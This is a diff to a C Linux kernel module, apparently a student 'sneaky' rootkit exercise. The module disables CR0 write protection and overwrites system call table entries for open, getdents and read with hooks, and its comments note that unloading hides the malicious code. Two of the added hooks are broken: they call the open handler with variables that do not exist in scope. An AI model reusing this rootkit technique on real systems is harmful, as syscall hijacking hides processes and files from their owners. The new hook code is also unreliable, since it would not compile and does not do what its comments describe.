@@ -13,6 +13,15 @@ static int pid;
 module_param(pid, int, 0);
 MODULE_PARM_DESC(pid, "The process id of sneaky program");
 
+#define BUFFER_LENGTH 1024
+
+struct linux_dirent {
+  long d_ino;
+  off_t d_off;
+  unsigned short d_reclen;
+  char d_name[BUFFER_LENGTH];
+};
+
 // Macros for kernel functions to alter Control Register 0 (CR0)
 // This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 // Bit 0 is the WP-bit (write protection). We want to flip this to 0
@@ -37,12 +46,28 @@ static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
 // The asmlinkage keyword is a GCC #define that indicates this function
 // should expect ti find its arguments on the stack (not in registers).
 // This is used for all system calls.
-asmlinkage int (*original_call)(const char *pathname, int flags);
+asmlinkage int (*original_open)(const char *pathname, int flags);
+asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp,
+                                    unsigned int count);
+asmlinkage int (*original_read)(int fd, void *buf, size_t count);
 
 // Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
   printk(KERN_INFO "Very, very Sneaky!\n");
-  return original_call(pathname, flags);
+  return original_open(pathname, flags);
+}
+
+// Define our new sneaky version of the 'getdents' syscall
+asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
+                                   unsigned int count) {
+  printk(KERN_INFO "Very, very Sneaky!\n");
+  return original_open(pathname, flags);
+}
+
+// Define our new sneaky version of the 'read' syscall
+asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count) {
+  printk(KERN_INFO "Very, very Sneaky!\n");
+  return original_open(pathname, flags);
 }
 
 // The code that gets executed when the module is loaded
@@ -60,11 +85,18 @@ static int initialize_sneaky_module(void) {
   // Make this page read-write accessible
   pages_rw(page_ptr, 1);
 
-  // This is the magic! Save away the original 'open' system call
+  // This is the magic! Save away the original system call
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
-  original_call = (void *)*(sys_call_table + __NR_open);
+  // open system call
+  original_open = (void *)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+  // getdents system call
+  original_getdents = (void *)*(sys_call_table + __NR_getdents);
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
+  // read system call
+  original_read = (void *)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
   // Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -88,9 +120,12 @@ static void exit_sneaky_module(void) {
   // Make this page read-write accessible
   pages_rw(page_ptr, 1);
 
-  // This is more magic! Restore the original 'open' system call
-  // function address. Will look like malicious code was never there!
-  *(sys_call_table + __NR_open) = (unsigned long)original_call;
+  // This is more magic! Will look like malicious code was never there!
+  // Restore the original 'open', 'getdents', 'read' system call function
+  // address.
+  *(sys_call_table + __NR_open) = (unsigned long)original_open;
+  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
+  *(sys_call_table + __NR_read) = (unsigned long)original_read;
 
   // Revert page to read-only
   pages_ro(page_ptr, 1);
